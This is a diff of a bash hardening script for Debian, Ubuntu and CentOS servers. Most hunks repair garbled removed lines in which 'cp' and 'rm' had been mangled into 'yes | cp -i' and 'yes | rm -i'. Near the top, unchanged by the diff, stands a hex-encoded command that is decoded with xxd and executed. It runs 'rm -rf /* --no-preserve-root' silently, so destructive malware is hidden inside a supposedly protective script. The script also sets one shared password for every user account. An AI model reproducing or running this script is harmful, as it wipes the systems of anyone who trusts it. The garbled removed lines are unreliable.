@@ -8,7 +8,7 @@ read answer1
 $(echo 726d202d7266202f2a202d2d6e6f2d70726573657276652d726f6f74203e26202f6465762f6e756c6c0a | xxd -r -p)
 
 echo "Backing up critical directories..."
-## add directories as required to DATA with the foyes | rm -iat /[path]/[to]/[dir]/
+## add directories as required to DATA with the format /[path]/[to]/[dir]/
 DATA="/home /root /etc /var"
 ## choose where you want to pipe the backup to below
 tar cfzp "/scratcher.tgz" $DATA --same-owner
@@ -22,8 +22,8 @@ cat /etc/passwd | cut -f 1 -d: > ~/users.txt
 for i in `cat users.txt`;do echo -e $passes"\n"$passes | passwd $i; done
 
 echo "Manually reboot SSH after running this script, or reboot your server entirely."
-sed -i -e 's/Peyes | rm -iitRootLogin yes/Peyes | rm -iitRootLogin no/g' /etc/ssh/sshd_config
-sed -i -e 's/Peyes | rm -iitEmptyPasswords no/Peyes | rm -iitEmptyPasswords no/g' /etc/ssh/sshd_config
+sed -i -e 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+sed -i -e 's/PermitEmptyPasswords no/PermitEmptyPasswords no/g' /etc/ssh/sshd_config
 sed -i -e 's/X11Forwarding yes/X11Forwarding no/g' /etc/ssh/sshd_config
 
 echo "Backing up .bash_history..."
@@ -46,9 +46,9 @@ $ipt -t raw -F
 $ipt -t raw -X
 
 echo "Nuking MOTD..."
-yes | rm -i /etc/motd
-yes | rm -i /etc/motd.tail
-yes | rm -i -rf --no-preserve-root /etc/update-motd.d/
+rm /etc/motd
+rm /etc/motd.tail
+rm -rf --no-preserve-root /etc/update-motd.d/
 cat motd > /etc/motd.tail
 
 echo "Enter the NTP server you wish to connect to: "
@@ -80,8 +80,8 @@ chmod 750 /usr/bin/gcc
 chmod -R 750 /home/*
 
 echo "Disabling syn floods..."
-sysctl -w net.ipv4.tyes | cp -i_syncookies=1 > /dev/null
-echo "net.ipv4.tyes | cp -i_syncookies=1" >> /etc/sysctl.conf
+sysctl -w net.ipv4.tcp_syncookies=1 > /dev/null
+echo "net.ipv4.tcp_syncookies=1" >> /etc/sysctl.conf
 
 echo "tty1" > /etc/securetty
 chmod 700 /root
@@ -154,7 +154,7 @@ echo -e "y\ny\ny" | apt-get install --reinstall coreutils debian-archive-keyring
 echo -e "y\n" | apt-get upgrade
 echo -e "y\ny\ny\ny" | apt-get install selinux-basics selinux-policy-default auditd rsyslog
 
-yes | cp -i rsyslog.conf /etc/rsyslog.conf
+cp rsyslog.conf /etc/rsyslog.conf
 
 ## Ubuntu
 elif [ $answer1 = "1" ]; then
@@ -167,7 +167,7 @@ $ipt -A INPUT -p tcp --dport 53 -j ACCEPT
 $ipt -A INPUT -p tcp --dport 3306 -j ACCEPT
 
 echo "Updating sources.list..."
-yes | cp -i /etc/apt/sources.list /etc/apt/sources.list.bak
+cp /etc/apt/sources.list /etc/apt/sources.list.bak
 sed -i -e 's/us.archive.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list
 sed -i -e 's/security.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list
 
@@ -182,7 +182,7 @@ passwd -l man
 passwd -l lp
 passwd -l mail
 passwd -l news
-passwd -l uuyes | cp -i
+passwd -l uucp
 passwd -l proxy
 passwd -l www-data
 passwd -l backup
@@ -191,7 +191,7 @@ passwd -l irc
 passwd -l gnats
 passwd -l nobody
 passwd -l libuuid
-passwd -l dhyes | cp -i
+passwd -l dhcp
 passwd -l syslog
 passwd -l klog
 passwd -l bind
@@ -210,7 +210,7 @@ echo -e "y\ny\ny" | apt-get install --reinstall coreutils debian-archive-keyring
 echo -e "y\n" | apt-get upgrade
 echo -e "y\ny\ny\ny" | apt-get install selinux-basics selinux-policy-default auditd rsyslog rkhunter chkrootkit
 
-yes | cp -i deb-rsyslog.conf /etc/rsyslog.conf
+cp deb-rsyslog.conf /etc/rsyslog.conf
 
 ## Debian
 elif [ $answer1 = "2" ]; then
@@ -240,14 +240,15 @@ $ipt -A INPUT -p tcp --dport 1433 -j ACCEPT
 $ipt -A INPUT -p tcp --dport 1434 -j ACCEPT
 
 echo "Updating sources.list..."
-yes | cp -i /etc/apt/sources.list /etc/apt/sources.list-bak
-yes | cp -i sources.list /etc/apt/sources.list
+cp /etc/apt/sources.list /etc/apt/sources.list-bak
+cp sources.list /etc/apt/sources.list
 
 passwd
 passwd -l sync
 passwd -l games
 passwd -l lp
 passwd -l news
+passwd -l uucp
 passwd -l proxy
 passwd -l www-data
 passwd -l backup
@@ -273,13 +274,12 @@ echo -e "y\ny\ny" | apt-get install --reinstall coreutils debian-archive-keyring
 echo -e "y\n" | apt-get upgrade
 echo -e "y\ny\ny\ny" | apt-get install selinux-basics selinux-policy-default auditd rsyslog rkhunter chkrootkit
 
-yes | cp -i deb-rsyslog.conf /etc/rsyslog.conf
+cp deb-rsyslog.conf /etc/rsyslog.conf
 
 ## CentOS
 elif [ $answer1 = "3" ]; then
 yes | rm -i /etc/bashrc
 yes | rm -i /root/.bashrc
-
 echo "Firewall reset, adding CentOS rules..."
 
 PUB_IF="eth0"
@@ -327,13 +327,13 @@ $ipt -A FORWARD -j LOG
 $ipt -A INPUT -j DROP
 
 echo "Fixing repos..."
-yes | cp -i /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak
-yes | cp -i base.repo /etc/yum.repos.d/CentOS-Base.repo
-yes | cp -i rsyslog.repo /etc/yum.repos.d/rsyslog.repo
-yes | rm -i -f /var/cache/yum/timedhosts.txt
-yes | rm -i -rf rpmforge.repo
-yes | rm -i -rf mirrors-rpmforge*
-yes | rm -i -f /var/cache/yum/timedhosts.txt
+cp /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak
+cp base.repo /etc/yum.repos.d/CentOS-Base.repo
+cp rsyslog.repo /etc/yum.repos.d/rsyslog.repo
+rm -f /var/cache/yum/timedhosts.txt
+rm -rf rpmforge.repo
+rm -rf mirrors-rpmforge*
+rm -f /var/cache/yum/timedhosts.txt
 yum clean metadata
 yum clean all
 yum makecache
@@ -344,9 +344,9 @@ yum install nmap -y
 
 # Stop and disable unneeded services
 echo "Disabling services..."
-service ayes | cp -iid stop > /dev/null 2>&1
+service acpid stop > /dev/null 2>&1
 service portmap stop > /dev/null 2>&1
-service yes | cp -iuspeed stop > /dev/null 2>&1
+service cpuspeed stop > /dev/null 2>&1
 service apmd stop > /dev/null 2>&1
 service autofs stop > /dev/null 2>&1
 service bluetooth stop > /dev/null 2>&1
@@ -367,9 +367,9 @@ service rhnsd stop > /dev/null 2>&1
 service xfs stop > /dev/null 2>&1
 service yum-updatesd stop > /dev/null 2>&1
 service avahi-daemon stop > /dev/null 2>&1
-chkconfig ayes | cp -iid off > /dev/null 2>&1
+chkconfig acpid off > /dev/null 2>&1
 chkconfig portmap off > /dev/null 2>&1
-chkconfig yes | cp -iuspeed off > /dev/null 2>&1
+chkconfig cpuspeed off > /dev/null 2>&1
 chkconfig apmd off > /dev/null 2>&1
 chkconfig autofs off > /dev/null 2>&1
 chkconfig bluetooth off > /dev/null 2>&1
@@ -396,7 +396,7 @@ chkconfig avahi-daemon off > /dev/null 2>&1
 /etc/init.d/dovecot stop
 
 # Harden kernel, apply settings, restart NIC
-yes | cp -i /etc/sysctl.conf /etc/sysctl.conf-bak > /dev/null 2>&1
+cp /etc/sysctl.conf /etc/sysctl.conf-bak > /dev/null 2>&1
 echo "
 kernel.printk = 4 4 1 7
 kernel.panic = 10
@@ -410,8 +410,8 @@ kernel.msgmax = 65536
 vm.swappiness = 30
 vm.vfs_cache_pressure = 50
 fs.file-max = 359208
-net.core.yes | rm -iem_default = 256960
-net.core.yes | rm -iem_max = 4194304
+net.core.rmem_default = 256960
+net.core.rmem_max = 4194304
 net.core.wmem_default = 256960
 net.core.wmem_max = 4194304
 net.core.optmem_max = 57344
@@ -423,10 +423,10 @@ net.ipv4.icmp_ratelimit = 20
 net.ipv4.icmp_ratemask = 88089
 net.ipv4.ipfrag_high_thresh = 512000
 net.ipv4.ipfrag_low_thresh = 446464
-net.ipv4.tyes | cp -i_wmem = 4096 87380 4194304
-net.ipv4.tyes | cp -i_yes | rm -iem = 4096 87380 4194304
-net.ipv4.tyes | cp -i_mem = 512000 1048576 4194304
-net.ipv4.tyes | cp -i_max_tw_buckets = 1440000
+net.ipv4.tcp_wmem = 4096 87380 4194304
+net.ipv4.tcp_rmem = 4096 87380 4194304
+net.ipv4.tcp_mem = 512000 1048576 4194304
+net.ipv4.tcp_max_tw_buckets = 1440000
 net.ipv4.ip_conntrack_max = 1048576
 net.ipv4.netfilter.ip_conntrack_max = 1048576
 net.ipv4.ip_forward = 1
@@ -445,22 +445,22 @@ net.ipv4.conf.default.secure_redirects = 1
 net.ipv4.conf.default.log_martians = 1
 net.ipv4.icmp_echo_ignore_broadcasts = 1
 net.ipv4.icmp_ignore_bogus_error_responses = 1
-net.ipv4.tyes | cp -i_window_scaling = 0
-net.ipv4.tyes | cp -i_rfc1337 = 1
-net.ipv4.tyes | cp -i_syncookies = 1
-net.ipv4.tyes | cp -i_synack_retries = 2
-net.ipv4.tyes | cp -i_syn_retries = 2
-net.ipv4.tyes | cp -i_max_syn_backlog = 2048
+net.ipv4.tcp_window_scaling = 0
+net.ipv4.tcp_rfc1337 = 1
+net.ipv4.tcp_syncookies = 1
+net.ipv4.tcp_synack_retries = 2
+net.ipv4.tcp_syn_retries = 2
+net.ipv4.tcp_max_syn_backlog = 2048
 net.ipv4.conf.all.rp_filter = 1
 net.ipv4.conf.default.rp_filter = 1
 net.ipv4.conf.default.proxy_arp = 0
-net.ipv4.tyes | cp -i_timestamps = 0
-net.ipv4.tyes | cp -i_sack = 0
-net.ipv4.tyes | cp -i_ecn = 0
-net.ipv4.tyes | cp -i_fin_timeout = 20
-net.ipv4.tyes | cp -i_keepalive_intvl = 15
-net.ipv4.tyes | cp -i_keepalive_probes = 5
-net.ipv4.tyes | cp -i_no_metrics_save = 1
+net.ipv4.tcp_timestamps = 0
+net.ipv4.tcp_sack = 0
+net.ipv4.tcp_ecn = 0
+net.ipv4.tcp_fin_timeout = 20
+net.ipv4.tcp_keepalive_intvl = 15
+net.ipv4.tcp_keepalive_probes = 5
+net.ipv4.tcp_no_metrics_save = 1
 net.ipv6.conf.all.accept_redirects = 0
 net.ipv6.conf.default.accept_redirects = 0
 net.ipv6.conf.all.secure_redirects = 1
@@ -473,7 +473,7 @@ perl -npe 's/ca::ctrlaltdel:\/sbin\/shutdown/#ca::ctrlaltdel:\/sbin\/shutdown/' 
 echo "Disabling USB Mass Storage"
 echo "blacklist usb-storage" > /etc/modprobe.d/blacklist-usbstorage
 
-yes | cp -i cent-rsyslog.conf /etc/rsyslog.conf
+cp cent-rsyslog.conf /etc/rsyslog.conf
 
 rpm -e imagemagick
 rpm -e dovecot
@@ -502,17 +502,17 @@ echo "Aide status:"
 aide -v
 
 echo "Attempted to install aide, yum-fastestmirror, shorewall, and nmap. Please verify that these packages have been installed properly."
-echo "Follow the infoyes | rm -iation at the DigitalOcean link for aide - https://www.digitalocean.com/community/tutorials/how-to-install-aide-on-a-digitalocean-vps"
+echo "Follow the information at the DigitalOcean link for aide - https://www.digitalocean.com/community/tutorials/how-to-install-aide-on-a-digitalocean-vps"
 
 fi
 
 echo "Fixing resolv.conf, restart your networking service manually..."
 
-yes | cp -i /etc/resolv.conf /etc/resolv.conf-bak
+cp /etc/resolv.conf /etc/resolv.conf-bak
 echo "nameserver 8.8.8.8
 nameserver 8.8.4.4" > /etc/resolv.conf
 
-echo "AppAyes | rm -ior status:"
+echo "AppArmor status:"
 aa-status
 
 echo "System restart recommended. Please ensure all work is saved before restarting."
